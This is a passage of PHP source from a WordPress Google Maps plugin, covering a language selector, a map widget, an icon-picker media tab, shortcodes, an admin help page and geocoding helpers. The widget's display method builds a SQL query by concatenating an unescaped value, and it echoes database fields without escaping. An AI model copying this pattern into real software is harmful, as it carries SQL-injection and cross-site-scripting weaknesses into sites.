 <option value="en-GB"<?php selected(get_option('wpgmp_language'),'en-GB') ?>><?php _e( 'ENGLISH (GREAT BRITAIN)', 'wpgmp_google_map' ) ?></option>
 <option value="es"<?php selected(get_option('wpgmp_language'),'es') ?>><?php _e( 'SPANISH', 'wpgmp_google_map' ) ?></option>
 <option value="fa"<?php selected(get_option('wpgmp_language'),'fa') ?>><?php _e( 'FARSI', 'wpgmp_google_map' ) ?></option>
 <option value="fi"<?php selected(get_option('wpgmp_language'),'fi') ?>><?php _e( 'FINNISH', 'wpgmp_google_map' ) ?></option>
 <option value="fil"<?php selected(get_option('wpgmp_language'),'fil') ?>><?php _e( 'FILIPINO', 'wpgmp_google_map' ) ?></option>
 <option value="fr"<?php selected(get_option('wpgmp_language'),'fr') ?>><?php _e( 'FRENCH', 'wpgmp_google_map' ) ?></option>
 <option value="gl"<?php selected(get_option('wpgmp_language'),'gl') ?>><?php _e( 'GALICIAN', 'wpgmp_google_map' ) ?></option>
 <option value="gu"<?php selected(get_option('wpgmp_language'),'gu') ?>><?php _e( 'GUJARATI', 'wpgmp_google_map' ) ?></option>
 <option value="hi"<?php selected(get_option('wpgmp_language'),'hi') ?>><?php _e( 'HINDI', 'wpgmp_google_map' ) ?></option>
 <option value="hr"<?php selected(get_option('wpgmp_language'),'hr') ?>><?php _e( 'CROATIAN', 'wpgmp_google_map' ) ?></option>
 <option value="hu"<?php selected(get_option('wpgmp_language'),'hu') ?>><?php _e( 'HUNGARIAN', 'wpgmp_google_map' ) ?></option>
 <option value="id"<?php selected(get_option('wpgmp_language'),'id') ?>><?php _e( 'INDONESIAN', 'wpgmp_google_map' ) ?></option>
 <option value="it"<?php selected(get_option('wpgmp_language'),'it') ?>><?php _e( 'ITALIAN', 'wpgmp_google_map' ) ?></option>
 <option value="iw"<?php selected(get_option('wpgmp_language'),'iw') ?>><?php _e( 'HEBREW', 'wpgmp_google_map' ) ?></option>
 <option value="ja"<?php selected(get_option('wpgmp_language'),'ja') ?>><?php _e( 'JAPANESE', 'wpgmp_google_map' ) ?></option>
 <option value="kn"<?php selected(get_option('wpgmp_language'),'kn') ?>><?php _e( 'KANNADA', 'wpgmp_google_map' ) ?></option>
 <option value="ko"<?php selected(get_option('wpgmp_language'),'ko') ?>><?php _e( 'KOREAN', 'wpgmp_google_map' ) ?></option>
 <option value="lt"<?php selected(get_option('wpgmp_language'),'lt') ?>><?php _e( 'LITHUANIAN', 'wpgmp_google_map' ) ?></option>
 <option value="lv"<?php selected(get_option('wpgmp_language'),'lv') ?>><?php _e( 'LATVIAN', 'wpgmp_google_map' ) ?></option>
 <option value="ml"<?php selected(get_option('wpgmp_language'),'ml') ?>><?php _e( 'MALAYALAM', 'wpgmp_google_map' ) ?></option>
 <option value="mr"<?php selected(get_option('wpgmp_language'),'mr') ?>><?php _e( 'MARATHI', 'wpgmp_google_map' ) ?></option>
 <option value="nl"<?php selected(get_option('wpgmp_language'),'nl') ?>><?php _e( 'DUTCH', 'wpgmp_google_map' ) ?></option>
 <option value="no"<?php selected(get_option('wpgmp_language'),'no') ?>><?php _e( 'NORWEGIAN', 'wpgmp_google_map' ) ?></option>
 <option value="pl"<?php selected(get_option('wpgmp_language'),'pl') ?>><?php _e( 'POLISH', 'wpgmp_google_map' ) ?></option>
 <option value="pt"<?php selected(get_option('wpgmp_language'),'pt') ?>><?php _e( 'PORTUGUESE', 'wpgmp_google_map' ) ?></option>
 <option value="pt-BR"<?php selected(get_option('wpgmp_language'),'pt-BR') ?>><?php _e( 'PORTUGUESE (BRAZIL)', 'wpgmp_google_map' ) ?></option>
 <option value="pt-PT"<?php selected(get_option('wpgmp_language'),'pt-PT') ?>><?php _e( 'PORTUGUESE (PORTUGAL)', 'wpgmp_google_map' ) ?></option>
 <option value="ro"<?php selected(get_option('wpgmp_language'),'ro') ?>><?php _e( 'ROMANIAN', 'wpgmp_google_map' ) ?></option>
 <option value="ru"<?php selected(get_option('wpgmp_language'),'ru') ?>><?php _e( 'RUSSIAN', 'wpgmp_google_map' ) ?></option>
 <option value="sk"<?php selected(get_option('wpgmp_language'),'sk') ?>><?php _e( 'SLOVAK', 'wpgmp_google_map' ) ?></option>
 <option value="sl"<?php selected(get_option('wpgmp_language'),'sl') ?>><?php _e( 'SLOVENIAN', 'wpgmp_google_map' ) ?></option>
 <option value="sr"<?php selected(get_option('wpgmp_language'),'sr') ?>><?php _e( 'SERBIAN', 'wpgmp_google_map' ) ?></option>
 <option value="sv"<?php selected(get_option('wpgmp_language'),'sv') ?>><?php _e( 'SWEDISH', 'wpgmp_google_map' ) ?></option>
 <option value="tl"<?php selected(get_option('wpgmp_language'),'tl') ?>><?php _e( 'TAGALOG', 'wpgmp_google_map' ) ?></option>
 <option value="ta"<?php selected(get_option('wpgmp_language'),'ta') ?>><?php _e( 'TAMIL', 'wpgmp_google_map' ) ?></option>
 <option value="te"<?php selected(get_option('wpgmp_language'),'te') ?>><?php _e( 'TELUGU', 'wpgmp_google_map' ) ?></option>
 <option value="th"<?php selected(get_option('wpgmp_language'),'th') ?>><?php _e( 'THAI', 'wpgmp_google_map' ) ?></option>
 <option value="tr"<?php selected(get_option('wpgmp_language'),'tr') ?>><?php _e( 'TURKISH', 'wpgmp_google_map' ) ?></option>
 <option value="uk"<?php selected(get_option('wpgmp_language'),'uk') ?>><?php _e( 'UKRAINIAN', 'wpgmp_google_map' ) ?></option>
 <option value="vi"<?php selected(get_option('wpgmp_language'),'vi') ?>><?php _e( 'VIETNAMESE', 'wpgmp_google_map' ) ?></option>
 <option value="zh-CN"<?php selected(get_option('wpgmp_language'),'zh-CN') ?>><?php _e( 'CHINESE (SIMPLIFIED)', 'wpgmp_google_map' ) ?></option>
 <option value="zh-TW"<?php selected(get_option('wpgmp_language'),'zh-TW') ?>><?php _e( 'CHINESE (TRADITIONAL)', 'wpgmp_google_map' ) ?></option>
 </select>
<p class="description"><?php _e( 'Default is English.', 'wpgmp_google_map' ) ?></p>
</div>
 <input type="hidden" name="action" value="update" />  
<input type="hidden" name="page_options" value="wpgmp_zoomlevel,wpgmp_centerlatitude,wpgmp_centerlongitude,wpgmp_mapwidth,wpgmp_mapheight,wpgmp_language,wpgmp_default_marker,wpgmp_mashup" />  
   <div class="col-md-4 left">  </div><div class="col-md-7">  
    <input type="submit" name="submit" id="submit" class="btn btn-lg btn-primary" value="<?php _e( 'Save Changes', 'wpgmp_google_map' ) ?>"></div>
 		   </form> 
</div>
    </div> </div>  
<?php
}
/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_widget(){
	register_widget('wpgmp_google_map_widget');
}
/**
 * This class used to add widget support in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
class wpgmp_google_map_widget extends WP_Widget{
	public function __construct()
	{
		parent::__construct(
			'wpgmp_google_map_widget',
			'WP Google Map Plugin',
			array('description' => __('A widget that displays the google map' , 'wpgmp_google_map'))
		);
	}
	function widget( $args, $instance )
	{
		global $wpdb;
		extract($args);
		$title=$instance['title'];
		$map_title = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."create_map where map_id='".$title."'");
		echo $before_widget;
		
		if($title)
			echo $before_title . $map_title->map_title . $after_title;
		
		echo do_shortcode('[put_wpgm id='.$title.']' ).$after_widget;
	
	}
	function update( $new_instance, $old_instance )
	{
		$instance=$old_instance;
		$instance['title']=strip_tags($new_instance['title']);
		update_option('wpgmp_short_mapselect_marker' , $mark);
		return $instance;
	}
	function form( $instance )
	{
	
	global $wpdb;
	$map_records = $wpdb->get_results($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map",NULL));
	?>
	
		<p>
			<label for="<?php echo $this->get_field_id('title');?>" style="font-weight:bold;"><?php _e('Select Your Map:' , 'wpgmp_google_map');?>
			</label> 
				<select id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" style="width:80%;">
                <option value=""><?php _e( 'Select map', 'wpgmp_google_map' ) ?></option>
				<?php foreach($map_records as $key => $map_record){  ?>
 				<option value="<?php echo $map_record->map_id; ?>"<?php selected($map_record->map_id,$instance['title']); ?>><?php echo $map_record->map_title; ?></option>
				<?php } ?>	
				</select>
        </p>        
	<?php	
	}
}
/**
 * This function used to register google map script.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_scripts_method(){
    wp_enqueue_script('wpgmp_map','http://www.google.com/jsapi');
}



/**
 * This function used to load css in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_load(){
wp_enqueue_style(
		'google_map_css',
		plugins_url( '/css/google-map.css' , __FILE__ ));
	
}
  
function wpgmp_excerpt_more(){
 return '<br /><a class="read-more" href="'. get_permalink( get_the_ID() ) . '" target="_blank">Read More</a>';
}


 
/**
 * This function used to create tab.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_tabs_filter($tabs)
{
        $newtab = array('ell_insert_gmap_tab' => __('Choose Icons','wpgmp_google_map'));
        return array_merge($tabs,$newtab);
}
 
function wpgmp_google_map_media_upload_tab() {
	return wp_iframe('wpgmp_google_map_icon');
}
function wpgmp_google_map_icon()
{
echo media_upload_header();
$form_action_url = site_url( "wp-admin/media-upload.php?type={$GLOBALS['type']}&tab=ell_insert_gmap_tab", 'admin');
?>
<script type="text/javascript">
 function add_icon_to_images()
 {
	  if(jQuery('.read_icons').hasClass('active'))
	  {	  
	  	imgsrc = jQuery('.active').find('img').attr('src');
   		
		var win = window.dialogArguments || opener || parent || top;
   		
		win.send_icon_to_map(imgsrc);
  		
	  }
	  else
	  {
   		alert('Choose your icon.');
  	  }
 }
</script>
<form enctype="multipart/form-data" method="post" action="<?php echo esc_attr($form_action_url); ?>" class="media-upload-form" id="library-form">
<h3 class="media-title" style="color: #5A5A5A; font-family: Georgia, 'Times New Roman', Times, serif; font-weight: normal; font-size: 1.6em; margin-left: 10px;"><?php _e( 'Select Icons', 'wpgmp_google_map' ) ?></h3>
<div style="margin-bottom:30px; float:left;">
<ul style="margin-left:10px; float:left;" id="select_icons">
<?php
$dir = plugin_dir_path( __FILE__ ) . 'icons/';
if ( is_dir($dir)  )
{
  if ( $dh = opendir($dir) )
  {
    while (($file = readdir($dh)) !== false)
	{
?>	
<li class="read_icons" style="float:left;">	
      <img src="<?php echo plugins_url('/icons/'.$file.'', __FILE__ ); ?>" style="cursor:pointer;" />
</li>
<?php
    }
?>
<?php
    closedir($dh);
  }
}
?>
</ul>
<button type="button" class="button" style="margin-left:10px;" value="1" onclick="add_icon_to_images();" name="send[<?php echo $picid ?>]"><?php _e( 'Insert into Post', 'wpgmp_google_map' ) ?></button>
</div>
</form>
<?php
}  
 
/**
 * This function used to registered all action.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
  
 
 
function wpgmp_load_actions()
{
 wpgmp_scripts_method();
add_action('media_upload_ell_insert_gmap_tab', 'wpgmp_google_map_media_upload_tab');
add_filter('media_upload_tabs', 'wpgmp_google_map_tabs_filter');
add_action('admin_menu', 'wpgmp_google_map_page');
add_shortcode('put_wpgm','wpgmp_show_location_in_map');
add_shortcode('display_map','wpgmp_display_map');
add_action('admin_enqueue_scripts', 'wpgmp_admin_scripts');
add_action('admin_print_styles', 'wpgmp_admin_styles');
add_action('admin_head', 'wpgmp_js_head');
add_shortcode('post','return_post_content');
}

function return_post_content($atts, $content=null)
{
	$post = get_post($atts['id']);
	setup_postdata($post);
	$content = "<div><h4>".get_the_title()."</h4>";
	$content .= "<p>".get_the_excerpt()."</p>";
	wp_reset_postdata();
	return $content;
}

add_action('widgets_init' , 'wpgmp_google_map_widget');
add_action('init', 'wpgmp_load_actions');
include_once("wpgmp-all-js.php");
include_once("wpgmp-add-location.php");
include_once("wpgmp-manage-location.php");
include_once("wpgmp-create-map.php");
include_once("wpgmp-manage-map.php");
include_once("wpgmp-create-group-map.php");
include_once("wpgmp-manage-group-map.php");
include_once("wpgmp-display-map.php");

/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_showMessage($message, $errormsg = false)
{
	if( empty($message) )
	return;
	
	if ( $errormsg ) {
		echo '<div id="message" class="error">';
	}
	else {
		echo '<div id="message" class="updated">';
	}
	echo "<p><strong>$message</strong></p></div>";
} 
/**
 * This function used to show basic instruction for how to use this plugin.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_admin_overview()  {
	?>
	<div class="wrap wpgmp-wrap">
    <div class="col-md-11"> 
		<h3><span class="glyphicon glyphicon-asterisk"></span><?php _e('How to Use', 'wpgmp_google_map') ?></h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
							<?php _e('Go through the steps below to create your first map:', 'wpgmp_google_map') ?>
							<p>
							
							<b><?php _e('Step 1', 'wpgmp_google_map') ?></b> - <?php _e('Use our auto suggestion enabled location box to add your location', 'wpgmp_google_map') ?> <a href="<?php echo admin_url('admin.php?page=wpgmp_add_location') ?>"><?php _e('Here', 'wpgmp_google_map') ?></a>. <?php _e('You can add multiple locations. All those locations will be available to choose when you create your map.', 'wpgmp_google_map') ?> </li>
							
							</p>
							<p>
							<b><?php _e('Step 2', 'wpgmp_google_map') ?></b> - <?php _e('Now', 'wpgmp_google_map') ?> <a href="<?php echo admin_url('admin.php?page=wpgmp_create_map') ?>"><?php _e('Click Here', 'wpgmp_google_map') ?></a> <?php _e(' to create a map. You can create as many maps you want to add. Using shortcode, you can add maps on posts/pages.', 'wpgmp_google_map') ?> </li>
							</p>
							<p>
							<b><?php _e('Step 3', 'wpgmp_google_map') ?></b> - <?php _e('When done with administrative tasks, you can display map on posts/pages using', 'wpgmp_google_map') ?> <a href="<?php echo admin_url('admin.php?page=wpgmp_google_wpgmp_manage_map') ?>"><?php _e('Shortcode', 'wpgmp_google_map') ?></a> <?php _e(' enable map in the widgets section to display in sidebar. ', 'wpgmp_google_map') ?> .</li>
							</p>
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>
		<div style="clear:both"></div>
			<h3><span class="glyphicon glyphicon-asterisk"></span><?php _e('Pro Version', 'wpgmp_google_map') ?></h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
							<?php _e('Explore countless other customizable features in the pro version of this most advanced Google Maps plugin.', 'wpgmp_google_map') ?> <a href="http://codecanyon.net/item/advanced-google-maps/5211638" target="_blank"><?php _e('Pro Version', 'wpgmp_google_map') ?></a> is available on Codecanyon.
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>

	
		<div style="clear:both"></div>
			<h3><span class="glyphicon glyphicon-asterisk"></span><?php _e('Online Documentation', 'wpgmp_google_map') ?></h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
							<?php _e('Documentation is available with the zipped package of the purchased plugin or visit our ', 'wpgmp_google_map') ?> <a href="http://www.flippercode.com" target="_blank"><?php _e('Official Website', 'wpgmp_google_map') ?></a> for <a href="http://www.flippercode.com" target="_blank"><?php _e('online documentation', 'wpgmp_google_map') ?></a>.
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>
	</div>
	
	<?php
}
function wpgmp_is_mobile() {
	        static $is_mobile;
	
	        if ( isset($is_mobile) )
	                return $is_mobile;
	
	        if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
	                $is_mobile = false;
	        } elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false // many mobile devices (all iPhone, iPad, etc.)
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mobi') !== false ) {
	                        $is_mobile = true;
	        } else {
	                $is_mobile = false;
	        }
	
	        return $is_mobile;
}
function wpgmp_get_coordinates( $content, $force_refresh = false ) {
    $address_hash = md5( $content );
    $coordinates = get_transient( $address_hash );
    if ($force_refresh || $coordinates === false) {
    	$args       = array( 'address' => urlencode( $content ), 'sensor' => 'false' );
    	$url        = add_query_arg( $args, 'http://maps.googleapis.com/maps/api/geocode/json' );
     	$response 	= wp_remote_get( $url );
     	if( is_wp_error( $response ) )
     		return;
     	$data = wp_remote_retrieve_body( $response );
     	if( is_wp_error( $data ) )
     		return;
		if ( $response['response']['code'] == 200 ) {
			$data = json_decode( $data );
			if ( $data->status === 'OK' ) {
			  	$coordinates = $data->results[0]->geometry->location;
			  	$cache_value['lat'] 	= $coordinates->lat;
			  	$cache_value['lng'] 	= $coordinates->lng;
			  	$cache_value['address'] = (string) $data->results[0]->formatted_address;
			  	// cache coordinates for 3 months
			  	set_transient($address_hash, $cache_value, 3600*24*30*3);
			  	$data = $cache_value;
			} elseif ( $data->status === 'ZERO_RESULTS' ) {
			  	return __( 'No location found for the entered address.', 'wpgmp_google_map' );
			} elseif( $data->status === 'INVALID_REQUEST' ) {
			   	return __( 'Invalid request. Did you enter an address?', 'wpgmp_google_map' );
			} else {
				return __( 'Something went wrong while retrieving your map, please ensure you have entered the short code correctly.', 'wpgmp_google_map' );
			}
		} else {
		 	return __( 'Unable to contact Google API service.', 'wpgmp_google_map' );
		}
    } else {
       // return cached results
       $data = $coordinates;
    }
    return $data;
}
function wpgmp_get_address_coordinates( $new_loc_add, $force_refresh = false ) {
    $address_hash = md5( $new_loc_add );
	
    $coordinates = get_transient( $address_hash );
    if ($force_refresh || $coordinates === false) {
    	$args       = array( 'address' => urlencode( $new_loc_add ), 'sensor' => 'false' );
    	$url        = add_query_arg( $args, 'http://maps.googleapis.com/maps/api/geocode/json' );
     	$response 	= wp_remote_get( $url );
     	if( is_wp_error( $response ) )
     		return;
     	$data = wp_remote_retrieve_body( $response );
     	if( is_wp_error( $data ) )
     		return;
		if ( $response['response']['code'] == 200 ) {
			$data = json_decode( $data );
			if ( $data->status === 'OK' ) {
			  	$coordinates = $data->results[0]->geometry->location;
			  	$cache_value['lat'] 	= $coordinates->lat;
			  	$cache_value['lng'] 	= $coordinates->lng;
			  	$cache_value['address'] = (string) $data->results[0]->formatted_address;
			  	// cache coordinates for 3 months
			  	set_transient($address_hash, $cache_value, 3600*24*30*3);
			  	$data = $cache_value;
			} elseif ( $data->status === 'ZERO_RESULTS' ) {
			  	return __( 'No location found for the entered address.', 'wpgmp_google_map' );
			} elseif( $data->status === 'INVALID_REQUEST' ) {
			   	return __( 'Invalid request. Did you enter an address?', 'wpgmp_google_map' );
			} else {
				return __( 'Something went wrong while retrieving your map, please ensure you have entered the short code correctly.', 'wpgmp_google_map' );
			}
		} else {
		 	return __( 'Unable to contact Google API service.', 'wpgmp_google_map' );
		}
    } else {
       // return cached results
       $data = $coordinates;
    }
    return $data;
}
